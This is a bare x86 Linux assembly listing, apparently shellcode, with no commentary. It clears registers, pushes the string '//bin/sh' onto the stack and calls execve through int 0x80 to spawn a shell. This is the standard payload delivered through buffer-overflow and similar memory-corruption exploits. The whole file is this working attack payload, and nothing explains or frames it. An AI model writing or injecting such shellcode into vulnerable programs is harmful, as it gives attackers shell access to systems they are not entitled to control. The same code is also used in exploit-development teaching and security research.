global _start
section .txt

_start:
	xor eax,eax
	xor esi,esi

	mov al,0xb
	 ;0x2f2f62696e2f7368a
	push esi
	push 0x68732f6e
	push 0x69622f2f
	mov ebx,esp
	
	mov ecx,esi
	mov edx,esi
	int 0x80


